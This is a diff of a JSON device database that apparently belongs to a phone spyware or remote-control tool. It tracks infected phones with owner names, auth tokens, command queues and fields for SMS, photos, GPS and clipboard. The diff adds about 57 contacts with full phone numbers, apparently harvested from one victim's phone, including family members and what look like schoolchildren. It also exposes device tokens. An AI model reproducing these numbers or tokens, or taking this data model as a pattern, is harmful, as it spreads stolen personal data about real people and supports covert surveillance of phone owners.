@@ -36,7 +36,7 @@
     "deviceName": "HP-LOCK-F00B",
     "ownerUsername": "Riz99",
     "token": "16f4a0bcfda1d2b0cee9ad894d0286d0",
-    "lastSeen": 1775762008338,
+    "lastSeen": 1775762035359,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-09T16:24:02.368Z",
@@ -2594,7 +2594,7 @@
     "deviceName": "HP-RANSZZ-5B45",
     "ownerUsername": "RANSZZ",
     "token": "5254feb49c7af70650dd79eaee46dffd",
-    "lastSeen": 1775762009686,
+    "lastSeen": 1775762036701,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-09T18:28:35.828Z",
@@ -2612,7 +2612,232 @@
     "smsMessages": [],
     "galleryPhotos": [],
     "galleryDone": false,
-    "contacts": [],
+    "contacts": [
+      {
+        "name": ". Aisah",
+        "phone": "+6282299974031"
+      },
+      {
+        "name": ". yuk risma",
+        "phone": "+6285609827688"
+      },
+      {
+        "name": "★ Zaara Al Tiara",
+        "phone": "+6283143802758"
+      },
+      {
+        "name": "🃏 Alpan",
+        "phone": "+6283198129221"
+      },
+      {
+        "name": "afra",
+        "phone": "+6285609620875"
+      },
+      {
+        "name": "aji anggoro",
+        "phone": "+6283194106489"
+      },
+      {
+        "name": "alya darseh",
+        "phone": "+6285704159376"
+      },
+      {
+        "name": "aulia Lampung",
+        "phone": "+62881012353935"
+      },
+      {
+        "name": "ayah ku",
+        "phone": "+6281279430353"
+      },
+      {
+        "name": "azambee",
+        "phone": "+6282164074418"
+      },
+      {
+        "name": "Azzam kawan sd adiii",
+        "phone": "+6285643083699"
+      },
+      {
+        "name": "𝐴𝐾𝐵𝐴𝑅",
+        "phone": "+6282181424438"
+      },
+      {
+        "name": "Bayu Saputra Jr 7.2",
+        "phone": "+6285658321171"
+      },
+      {
+        "name": "BUYER FRESS RANSZZ STORE 1756",
+        "phone": "+6285229017775"
+      },
+      {
+        "name": "Cahyana 7.2",
+        "phone": "+6283125518808"
+      },
+      {
+        "name": "Cinta",
+        "phone": "+6283181675192"
+      },
+      {
+        "name": "DAYSZU STORE PARTNER BOMEL SEMVWAK",
+        "phone": "+6285717489189"
+      },
+      {
+        "name": "Deszz Endes",
+        "phone": "+6283178274516"
+      },
+      {
+        "name": "Deylin",
+        "phone": "+6283143545779"
+      },
+      {
+        "name": "Farel",
+        "phone": "+6288276711083"
+      },
+      {
+        "name": "FAUZI STORE ACH PP BOMELxOMLING",
+        "phone": "+6281327606652"
+      },
+      {
+        "name": "galuh Prib",
+        "phone": "+6283836723733"
+      },
+      {
+        "name": "Ibu Ku",
+        "phone": "+6282372448592"
+      },
+      {
+        "name": "ila",
+        "phone": "+6283165837829"
+      },
+      {
+        "name": "iqbal",
+        "phone": "+6285664249750"
+      },
+      {
+        "name": "ira",
+        "phone": "+6285768711096"
+      },
+      {
+        "name": "iraaa. X",
+        "phone": "+6285768711096"
+      },
+      {
+        "name": "JIBRAN JB",
+        "phone": "+6281367005962"
+      },
+      {
+        "name": "kakak ku",
+        "phone": "+6283809861971"
+      },
+      {
+        "name": "Kenzi 7.2",
+        "phone": "+6285840117705"
+      },
+      {
+        "name": "ketua gugus 6",
+        "phone": "+6285768165369"
+      },
+      {
+        "name": "Khianbeast Khuandra",
+        "phone": "+6283198129274"
+      },
+      {
+        "name": "lisa 7.2",
+        "phone": "+6285382354930"
+      },
+      {
+        "name": "M Rizki Maulana 7.2",
+        "phone": "+6289637410213"
+      },
+      {
+        "name": "M. Rizki alfairo 7.2",
+        "phone": "+6282196551393"
+      },
+      {
+        "name": "M.dirga Saputra 7.2",
+        "phone": "+6288276631981"
+      },
+      {
+        "name": "M.faizzar",
+        "phone": "+6285783716802"
+      },
+      {
+        "name": "madan",
+        "phone": "+6282162674041"
+      },
+      {
+        "name": "Mika",
+        "phone": "+6283139034473"
+      },
+      {
+        "name": "nopal",
+        "phone": "+6285378301921"
+      },
+      {
+        "name": "peri 7 .2",
+        "phone": "+6285896222717"
+      },
+      {
+        "name": "RAMDANI 7.2",
+        "phone": "+6288706429481"
+      },
+      {
+        "name": "rapi begadang",
+        "phone": "+6285809467524"
+      },
+      {
+        "name": "rapi kawan sd",
+        "phone": "+6283845937924"
+      },
+      {
+        "name": "Revan syah 7.2",
+        "phone": "+6282267718708"
+      },
+      {
+        "name": "rifki",
+        "phone": "+6282177933058"
+      },
+      {
+        "name": "Rina nur mulia",
+        "phone": "+6285378571226"
+      },
+      {
+        "name": "Robii",
+        "phone": "+6281367376170"
+      },
+      {
+        "name": "Ryan",
+        "phone": "+6283119474288"
+      },
+      {
+        "name": "sesya Ecak",
+        "phone": "+6282287955838"
+      },
+      {
+        "name": "Wanz Tian",
+        "phone": "+6282318859898"
+      },
+      {
+        "name": "Wanz Tian",
+        "phone": "+62881012266098"
+      },
+      {
+        "name": "X👤❤️‍🩹",
+        "phone": "+6282279537230"
+      },
+      {
+        "name": "zakiyyy 7.2",
+        "phone": "+6285896187195"
+      },
+      {
+        "name": "ZIDANE",
+        "phone": "+6283160710747"
+      },
+      {
+        "name": "zihan_11 7.2",
+        "phone": "+6282363342321"
+      }
+    ],
     "lastGps": null,
     "gpsList": [],
     "lastClipboard": null,
